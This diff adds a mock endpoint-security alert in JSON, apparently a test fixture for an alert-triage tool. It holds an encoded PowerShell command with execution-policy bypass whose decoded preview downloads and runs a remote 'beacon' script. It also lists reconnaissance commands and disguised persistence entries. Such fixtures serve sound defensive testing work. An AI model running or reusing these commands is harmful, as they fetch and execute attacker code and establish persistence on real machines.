@@ -1,0 +1,90 @@
+{
+  "id": "alert_powershell_001",
+  "title": "Suspicious PowerShell encoded command",
+  "description": "Endpoint telemetry detected encoded PowerShell with network download behavior.",
+  "source": "mock",
+  "vendor": null,
+  "product": null,
+  "device_type": "mock",
+  "severity": "high",
+  "category": "suspicious_powershell",
+  "status": "new",
+  "entities": {
+    "host": "win-fin-02",
+    "username": "finance.user",
+    "process": "powershell.exe"
+  },
+  "time_range": {
+    "start": "2026-05-22T10:50:00Z",
+    "end": "2026-05-22T11:10:00Z"
+  },
+  "raw": {
+    "sample": "suspicious_powershell",
+    "vendor": "Microsoft",
+    "product": "Windows Defender ATP",
+    "detection_type": "amsi_scan",
+    "event_id": 4104,
+    "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADMAOgA4ADAAOAAwAC8AYgBlAGEAYwBvAG4AJwApAA==",
+    "decoded_command_preview": "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.53:8080/beacon')",
+    "parent_process": "OUTLOOK.EXE",
+    "parent_pid": 4512,
+    "grandparent_process": "winword.exe",
+    "event_count": 42,
+    "total_script_blocks": 15,
+    "encoded_commands_detected": 3,
+    "amsi_detection_count": 7,
+    "network_connections_made": 8,
+    "unique_dst_ips": [
+      "192.168.1.53",
+      "10.10.10.100",
+      "203.0.113.77"
+    ],
+    "dns_queries": [
+      "update-check.example.net",
+      "evil-payload.example.org",
+      "cdn-package.example.com"
+    ],
+    "files_written": [
+      "C:\\Users\\finance.user\\AppData\\Local\\Temp\\beacon.ps1",
+      "C:\\Users\\finance.user\\AppData\\Local\\Temp\\svchost.ps1",
+      "C:\\Windows\\Temp\\dllhost.exe"
+    ],
+    "registry_keys_modified": [
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
+      "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth"
+    ],
+    "scheduled_tasks_created": [
+      "WindowsUpdateTask",
+      "AdobeFlashUpdater"
+    ],
+    "child_processes": [
+      {
+        "name": "cmd.exe",
+        "pid": 6789,
+        "command": "cmd /c whoami"
+      },
+      {
+        "name": "cmd.exe",
+        "pid": 6792,
+        "command": "cmd /c ipconfig"
+      },
+      {
+        "name": "rundll32.exe",
+        "pid": 6790
+      },
+      {
+        "name": "schtasks.exe",
+        "pid": 6800
+      },
+      {
+        "name": "net.exe",
+        "pid": 6810,
+        "command": "net user"
+      }
+    ],
+    "user_agent": "PowerShell/5.1",
+    "execution_policy_bypass": true,
+    "integrity_level": "High"
+  },
+  "created_at": "2026-05-22T11:00:00Z"
+}
